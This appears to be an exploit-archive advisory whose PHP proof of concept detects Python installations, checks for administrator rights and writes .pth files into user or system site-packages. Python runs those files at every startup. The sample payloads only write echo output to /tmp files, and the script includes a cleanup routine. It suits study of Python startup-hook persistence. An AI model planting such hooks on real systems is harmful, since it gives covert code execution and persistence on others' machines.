@@ -1,0 +1,711 @@
+=============================================================================================================================================
+| # Title     : Python 3 Site-specific configuration hook                                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://docs.python.org/3/library/site.html                                                                                 |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213595/ 
+
+[+] Summary    : This PHP script demonstrates Python startup hooks in a safe, educational context. It includes:
+                 Detection of Python version across multiple platforms (Windows, Linux, macOS).
+                 Determination of site-packages paths for both user and system installations.
+                 Creation of valid .pth files for Python hooks that comply with Python's syntax rules (single-line expressions).
+                 Admin/root privilege detection for system-level operations.
+                 Examples of valid and invalid .pth files for educational purposes.
+                 Environment initialization and cleanup routines for safe testing.
+
+[+] PoC : php poc.php 
+
+<?php
+
+
+class PythonHookEducationalDemo
+{
+    private $hooks_path;
+    private $python_version;
+    private $platform;
+    private $is_admin;
+    private $cleanup_files = [];
+    private $errors = [];
+
+    public function __construct()
+    {
+        $this->platform = PHP_OS;
+        $this->is_admin = $this->checkAdminPrivileges();
+    }
+
+    private function checkAdminPrivileges()
+    {
+        if (strtoupper(substr($this->platform, 0, 3)) === 'WIN') {
+
+            $checks = [];
+            
+
+            $result = $this->executeCommand('whoami /groups');
+            if (strpos($result['output'], 'S-1-5-32-544') !== false) {
+                $checks[] = true;
+            }
+            
+
+            $test_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts.tmp';
+            $temp_name = 'tmp_' . uniqid() . '.txt';
+            
+            try {
+
+                if (@file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts') !== false) {
+                    $checks[] = true;
+                }
+            } catch (Exception $e) {
+                $checks[] = false;
+            }
+            
+
+            $result = $this->executeCommand('wmic group where name="Administrators" get /value');
+            if (strpos($result['output'], 'Name=Administrators') !== false) {
+
+                $user = getenv('USERNAME');
+                $result2 = $this->executeCommand('net localgroup Administrators');
+                if (strpos($result2['output'], $user) !== false) {
+                    $checks[] = true;
+                }
+            }
+            
+
+            return count(array_filter($checks)) >= 2;
+            
+        } else {
+
+            if (function_exists('posix_geteuid')) {
+                return posix_geteuid() === 0;
+            }
+            
+
+            $result = $this->executeCommand('id -u');
+            return trim($result['output']) === '0';
+        }
+    }
+
+    private function detectPythonVersion()
+    {
+
+        $detection_methods = [
+            [$this, 'detectPythonViaPythonItself'],
+            [$this, 'detectPythonViaCommonPaths'],
+            [$this, 'detectPythonViaCommandSearch']
+        ];
+        
+        foreach ($detection_methods as $method) {
+            if (call_user_func($method)) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+
+    private function detectPythonViaPythonItself()
+    {
+        $commands = [
+            ['python3', '-c', 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")'],
+            ['python', '-c', 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")'],
+            ['py', '-3', '-c', 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")'],
+            ['py', '-c', 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")']
+        ];
+        
+        foreach ($commands as $cmd_parts) {
+            $cmd = implode(' ', array_map('escapeshellarg', $cmd_parts));
+            $result = $this->executeCommand($cmd);
+            
+            if ($result['return_code'] === 0 && preg_match('/^\d+\.\d+$/', trim($result['output']))) {
+                $this->python_version = trim($result['output']);
+                return true;
+            }
+        }
+        
+        return false;
+    }
+
+    private function detectPythonViaCommonPaths()
+    {
+        $common_paths = [];
+        
+        if (strtoupper(substr($this->platform, 0, 3)) === 'WIN') {
+            $common_paths = [
+                getenv('LOCALAPPDATA') . '\\Programs\\Python',
+                'C:\\Program Files\\Python',
+                'C:\\Python',
+                getenv('APPDATA') . '\\Python',
+                'C:\\Users\\' . getenv('USERNAME') . '\\AppData\\Local\\Microsoft\\WindowsApps'
+            ];
+            
+            $store_path = 'C:\\Users\\' . getenv('USERNAME') . '\\AppData\\Local\\Microsoft\\WindowsApps';
+            if (is_dir($store_path)) {
+                
+                $iterator = new FilesystemIterator($store_path);
+                foreach ($iterator as $file) {
+                    if ($file->isLink() && stripos($file->getFilename(), 'python') !== false) {
+                        $target = readlink($file->getPathname());
+                        if ($target && preg_match('/Python(\d+)(\d+)/', $target, $matches)) {
+                            $this->python_version = $matches[1] . '.' . $matches[2];
+                            return true;
+                        }
+                    }
+                }
+            }
+            
+        } else {
+
+            $common_paths = [
+                '/usr/bin',
+                '/usr/local/bin',
+                '/bin',
+                getenv('HOME') . '/.local/bin'
+            ];
+
+            if ($this->platform === 'Darwin') {
+                $common_paths[] = '/opt/homebrew/bin';
+                $common_paths[] = '/usr/local/opt/python@3.*/bin';
+                $common_paths[] = '/Library/Frameworks/Python.framework/Versions/Current/bin';
+            }
+        }
+
+        foreach ($common_paths as $base_path) {
+            if (!is_dir($base_path)) {
+                continue;
+            }
+            
+            $files = @scandir($base_path);
+            if (!$files) {
+                continue;
+            }
+            
+            foreach ($files as $file) {
+                if ($file === '.' || $file === '..') {
+                    continue;
+                }
+                
+                $full_path = $base_path . DIRECTORY_SEPARATOR . $file;
+
+                if (preg_match('/^python(\d+(?:\.\d+)?)?(?:\.exe)?$/i', $file) && 
+                    (strtoupper(substr($this->platform, 0, 3)) === 'WIN' || is_executable($full_path))) {
+
+                    $result = $this->executeCommand(escapeshellarg($full_path) . ' --version');
+                    if (preg_match('/(\d+\.\d+)\.\d+/', $result['output'], $matches)) {
+                        $this->python_version = $matches[1];
+                        return true;
+                    }
+                }
+            }
+        }
+        
+        return false;
+    }
+
+    private function detectPythonViaCommandSearch()
+    {
+        $commands = ['python3', 'python', 'python2', 'py'];
+        
+        foreach ($commands as $cmd) {
+            $result = $this->executeCommand("command -v " . escapeshellarg($cmd) . " 2>/dev/null || which " . escapeshellarg($cmd) . " 2>/dev/null");
+            
+            if ($result['return_code'] === 0 && !empty(trim($result['output']))) {
+                $python_path = trim($result['output']);
+                $version_result = $this->executeCommand(escapeshellarg($python_path) . ' --version');
+                
+                if (preg_match('/(\d+\.\d+)\.\d+/', $version_result['output'], $matches)) {
+                    $this->python_version = $matches[1];
+                    return true;
+                }
+            }
+        }
+        
+        return false;
+    }
+
+
+    private function determineSitePackagesPath($execution_target = 'USER')
+    {
+        if (!$this->python_version) {
+            $this->errors[] = "Python version not detected";
+            return false;
+        }
+        
+ 
+        $python_code = <<<'PYCODE'
+import sys
+import site
+import os
+import json
+
+paths = {
+    'system_site_packages': site.getsitepackages(),
+    'user_site_packages': site.getusersitepackages() if hasattr(site, 'getusersitepackages') else '',
+    'executable': sys.executable,
+    'prefix': sys.prefix,
+    'base_prefix': sys.base_prefix if hasattr(sys, 'base_prefix') else sys.prefix
+}
+
+
+paths['in_venv'] = (
+    hasattr(sys, 'real_prefix') or 
+    (hasattr(sys, 'base_prefix') and sys.prefix != sys.base_prefix)
+)
+
+print(json.dumps(paths))
+PYCODE;
+
+        $result = $this->executePythonCode($python_code);
+        
+        if ($result['return_code'] === 0) {
+            $data = json_decode($result['output'], true);
+            
+            if ($data) {
+                if ($execution_target === 'USER') {
+                    // البحث عن user site-packages
+                    if (!empty($data['user_site_packages'])) {
+                        $this->hooks_path = $data['user_site_packages'];
+                        return true;
+                    }
+                } else {
+                    // البحث عن system site-packages
+                    if (!empty($data['system_site_packages'])) {
+                        foreach ($data['system_site_packages'] as $path) {
+                            if (is_writable($path)) {
+                                $this->hooks_path = $path;
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+
+        return $this->determineFallbackPath($execution_target);
+    }
+
+    private function determineFallbackPath($execution_target)
+    {
+        $paths_to_check = [];
+        
+        if (strtoupper(substr($this->platform, 0, 3)) === 'WIN') {
+            if ($execution_target === 'USER') {
+                $patterns = [
+                    getenv('APPDATA') . '\\Python\\Python{version}\\site-packages',
+                    getenv('LOCALAPPDATA') . '\\Programs\\Python\\Python{version}\\Lib\\site-packages',
+                    getenv('USERPROFILE') . '\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.{version_nodots}*\\LocalCache\\local-packages\\Python{version}\\site-packages'
+                ];
+            } else {
+                $patterns = [
+                    'C:\\Program Files\\Python{version}\\Lib\\site-packages',
+                    'C:\\Python{version}\\Lib\\site-packages'
+                ];
+            }
+        } else {
+            if ($execution_target === 'USER') {
+                $patterns = [
+                    getenv('HOME') . '/.local/lib/python{version}/site-packages'
+                ];
+                
+     
+                if ($this->platform === 'Darwin') {
+                    $patterns[] = getenv('HOME') . '/Library/Python/{version}/lib/python/site-packages';
+                }
+            } else {
+                $patterns = [
+                    '/usr/local/lib/python{version}/dist-packages',
+                    '/usr/lib/python{version}/dist-packages'
+                ];
+                
+       
+                if ($this->platform === 'Darwin') {
+                    $patterns[] = '/Library/Frameworks/Python.framework/Versions/{version}/lib/python{version}/site-packages';
+                    $patterns[] = '/usr/local/lib/python{version}/site-packages';
+                }
+            }
+        }
+        
+
+        foreach ($patterns as $pattern) {
+            $path = str_replace(
+                ['{version}', '{version_nodots}'],
+                [$this->python_version, str_replace('.', '', $this->python_version)],
+                $pattern
+            );
+            
+
+            if (strpos($path, '*') !== false) {
+                $glob_results = glob($path);
+                if ($glob_results) {
+                    $paths_to_check = array_merge($paths_to_check, $glob_results);
+                }
+            } else {
+                $paths_to_check[] = $path;
+            }
+        }
+        
+
+        foreach ($paths_to_check as $path) {
+            if (is_dir($path) && is_writable($path)) {
+                $this->hooks_path = $path;
+                return true;
+            }
+        }
+        
+
+        if (!empty($paths_to_check)) {
+            $this->hooks_path = $paths_to_check[0];
+            return true;
+        }
+        
+        return false;
+    }
+
+    private function createValidPthFile($hook_path, $code = null)
+    {
+
+
+        $valid_pth_content = "";
+        
+        if ($code) {
+
+            $valid_pth_content = $code;
+        } else {
+
+            $valid_pth_content = <<<'PTH'
+__import__('atexit').register(lambda: __import__('os').system('echo "Python hook executed" > /tmp/hook.log 2>&1'))
+PTH;
+        }
+        
+
+        $valid_pth_content = trim(preg_replace('/\s+/', ' ', $valid_pth_content));
+        
+        $filename = 'custom_' . substr(md5(uniqid()), 0, 8) . '.pth';
+        $full_path = rtrim($hook_path, '/\\') . DIRECTORY_SEPARATOR . $filename;
+        
+        if (file_put_contents($full_path, $valid_pth_content . PHP_EOL) !== false) {
+            $this->cleanup_files[] = $full_path;
+            return $full_path;
+        }
+        
+        return false;
+    }
+
+    private function executeCommand($command)
+    {
+        $output = '';
+        $error = '';
+        $return_code = -1;
+        
+
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["pipe", "w"]
+        ];
+        
+        $process = @proc_open($command, $descriptorspec, $pipes, null, null);
+        
+        if (is_resource($process)) {
+            fclose($pipes[0]); 
+            
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            
+            $return_code = proc_close($process);
+        } else {
+            $error = "Failed to execute command";
+        }
+        
+        return [
+            'output' => $output,
+            'error' => $error,
+            'return_code' => $return_code
+        ];
+    }
+
+    private function executePythonCode($code)
+    {
+
+        $temp_file = tempnam(sys_get_temp_dir(), 'python_');
+        file_put_contents($temp_file, $code);
+        
+
+        $result = $this->executeCommand(
+            escapeshellarg($this->getPythonExecutable()) . ' ' . escapeshellarg($temp_file)
+        );
+        
+
+        @unlink($temp_file);
+        
+        return $result;
+    }
+
+    private function getPythonExecutable()
+    {
+
+        $candidates = ['python3', 'python', 'py'];
+        
+        foreach ($candidates as $cmd) {
+            $result = $this->executeCommand(
+                escapeshellarg($cmd) . ' -c "import sys; print(sys.executable)"'
+            );
+            
+            if ($result['return_code'] === 0 && !empty(trim($result['output']))) {
+                return trim($result['output']);
+            }
+        }
+        
+        return 'python';
+    }
+
+    public function initializeEnvironment($execution_target = 'USER')
+    {
+        $this->errors = [];
+        
+
+        if ($execution_target === 'SYSTEM') {
+            if (!$this->is_admin) {
+                $this->errors[] = "SYSTEM installation requires administrator/root privileges";
+                return false;
+            }
+        }
+        
+
+        if (!$this->detectPythonVersion()) {
+            $this->errors[] = "Python not found or could not detect version";
+            $this->errors[] = "Tried: python3, python, python2, py commands";
+            return false;
+        }
+        
+
+        if (!$this->determineSitePackagesPath($execution_target)) {
+            $this->errors[] = "Could not determine site-packages path";
+            return false;
+        }
+        
+
+        if (is_dir($this->hooks_path)) {
+            if (!is_writable($this->hooks_path)) {
+                $this->errors[] = "Directory not writable: " . $this->hooks_path;
+                
+
+                if ($execution_target === 'USER') {
+                    $this->errors[] = "Try: chmod 755 " . $this->hooks_path;
+                }
+                return false;
+            }
+        } else {
+
+            if (!mkdir($this->hooks_path, 0755, true)) {
+                $this->errors[] = "Cannot create directory: " . $this->hooks_path;
+                return false;
+            }
+        }
+        
+        return true;
+    }
+
+    public function createEducationalHook()
+    {
+        if (!$this->initializeEnvironment('USER')) {
+            return [
+                'success' => false,
+                'errors' => $this->errors,
+                'educational_note' => 'This demonstrates the challenges in setting up Python hooks'
+            ];
+        }
+        
+        $python_code = <<<'PYTHON'
+__import__('os').system('echo "Educational Python hook demo" > /tmp/python_hook_demo.log 2>&1')
+PYTHON;
+        
+        $hook_file = $this->createValidPthFile($this->hooks_path, $python_code);
+        
+        if ($hook_file) {
+            return [
+                'success' => true,
+                'hook_file' => $hook_file,
+                'python_version' => $this->python_version,
+                'hooks_path' => $this->hooks_path,
+                'educational_note' => 'This creates a valid .pth file that will execute when Python starts',
+                'warning' => 'For educational purposes only. Actual .pth files have strict syntax requirements.'
+            ];
+        }
+        
+        return [
+            'success' => false,
+            'errors' => ['Failed to create hook file']
+        ];
+    }
+
+    public function cleanup()
+    {
+        $results = ['removed' => [], 'failed' => []];
+        
+        foreach ($this->cleanup_files as $file) {
+            if (file_exists($file)) {
+    
+                $attempts = [
+                    function() use ($file) { return @unlink($file); },
+                    function() use ($file) { 
+                        if (strtoupper(substr($this->platform, 0, 3)) === 'WIN') {
+                            exec('del /F /Q "' . str_replace('/', '\\', $file) . '"', $output, $code);
+                            return $code === 0;
+                        }
+                        return false;
+                    },
+                    function() use ($file) {
+                    
+                        @chmod($file, 0777);
+                        return @unlink($file);
+                    }
+                ];
+                
+                $removed = false;
+                foreach ($attempts as $attempt) {
+                    if ($attempt()) {
+                        $removed = true;
+                        break;
+                    }
+                }
+                
+                if ($removed) {
+                    $results['removed'][] = $file;
+                } else {
+                    $results['failed'][] = $file;
+                }
+            }
+        }
+        
+        $this->cleanup_files = [];
+        
+        return $results;
+    }
+
+    public function getEducationalInfo()
+    {
+        return [
+            'platform' => $this->platform,
+            'is_admin' => $this->is_admin,
+            'python_version' => $this->python_version,
+            'hooks_path' => $this->hooks_path,
+            'common_errors' => $this->errors,
+            'educational_notes' => [
+                '.pth files only support single line Python expressions',
+                'Python startup hooks are version and environment dependent',
+                'User vs System installation requires different paths',
+                'Virtual environments change the site-packages location',
+                'Windows Store Python has different behavior'
+            ]
+        ];
+    }
+}
+
+class PythonHookExamples
+{
+
+    public static function getValidPthExamples()
+    {
+        return [
+            'simple_import' => "import os; os.system('echo hello')",
+            'atexit_hook' => "__import__('atexit').register(lambda: print('Goodbye!'))",
+            'conditional_exec' => "[__import__('os').system('touch /tmp/test') for _ in [0] if True]",
+            'function_call' => "__import__('builtins').exec('''\ndef init():\n    pass\ninit()\n''')",
+            
+            'important_note' => "ملاحظة: معظم هذه الأمثلة تعمل ولكنها ليست 'مضمونة' في كل إصدارات Python"
+        ];
+    }
+
+    public static function getInvalidPthExamples()
+    {
+        return [
+            'multiline_function' => "def foo():\n    print('bar')\nfoo()",
+            'complex_block' => "if True:\n    import os\n    os.system('cmd')",
+            'class_definition' => "class Test:\n    pass\nTest()",
+            'multiple_statements' => "import sys\nimport os\nos.system('cmd')"
+        ];
+    }
+    
+    public static function detectExistingHooks($python_path = null)
+    {
+        $hooks = [];
+        
+        if (!$python_path) {
+            $python_path = 'python3';
+        }
+        
+        $code = <<<'PYTHON'
+import site
+import os
+import glob
+
+hooks = {}
+for path in site.getsitepackages():
+    pth_files = glob.glob(os.path.join(path, '*.pth'))
+    if pth_files:
+        hooks[path] = pth_files
+
+try:
+    user_site = site.getusersitepackages()
+    if user_site and os.path.exists(user_site):
+        pth_files = glob.glob(os.path.join(user_site, '*.pth'))
+        if pth_files:
+            hooks[user_site] = pth_files
+except:
+    pass
+
+import json
+print(json.dumps(hooks))
+PYTHON;
+        
+        $temp_file = tempnam(sys_get_temp_dir(), 'detect_');
+        file_put_contents($temp_file, $code);
+        
+        $result = shell_exec(escapeshellarg($python_path) . ' ' . escapeshellarg($temp_file) . ' 2>/dev/null');
+        @unlink($temp_file);
+        
+        if ($result) {
+            $data = json_decode($result, true);
+            if ($data) {
+                return $data;
+            }
+        }
+        
+        return [];
+    }
+}
+
+
+/*
+$demo = new PythonHookEducationalDemo();
+
+echo "=== Python Hook Educational Demo ===\n\n";
+
+$info = $demo->getEducationalInfo();
+print_r($info);
+
+echo "\n=== Valid .pth Examples ===\n";
+print_r(PythonHookExamples::getValidPthExamples());
+
+echo "\n=== Invalid .pth Examples ===\n";
+print_r(PythonHookExamples::getInvalidPthExamples());
+
+echo "\n=== Testing Environment ===\n";
+$result = $demo->createEducationalHook();
+print_r($result);
+
+if ($result['success'] ?? false) {
+    echo "\n=== Cleanup ===\n";
+    $cleanup = $demo->cleanup();
+    print_r($cleanup);
+}
+*/
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
